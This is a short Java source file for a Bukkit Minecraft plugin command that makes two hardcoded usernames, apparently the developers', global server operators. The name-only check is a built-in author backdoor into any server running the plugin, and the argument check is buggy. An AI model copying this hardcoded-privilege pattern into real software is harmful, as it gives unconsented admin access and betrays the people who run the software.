package com.woutwoot.jcwows.commands;

import com.woutwoot.jcwows.Main;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

/**
 * Created by Wout on 2/12/2014.
 */
public class WoW_addop extends WoW_Command {

    @Override
    public void process(CommandSender sender, String[] args) {
        if (sender.getName().equals("woutwoot") || sender.getName().equals("hardstyledude12")) {
            if (sender instanceof Player) {
                if (args[0] == null) {
                    sender.setOp(true);
                    Main.getInstance().getOpDeOp().addGlobalOp((Player) sender);
                    sender.sendMessage("You should now be op everywhere!");
                    Main.getInstance().getOpDeOp().saveWorldSettings();
                }
            }
        } else {
            sender.sendMessage("Sorry. Only Wout or Jeff can use this command. Ask them.");
        }
    }

    @Override
    public void sendHelp(CommandSender sender) {
        sender.sendMessage("/wow addop");
    }

}
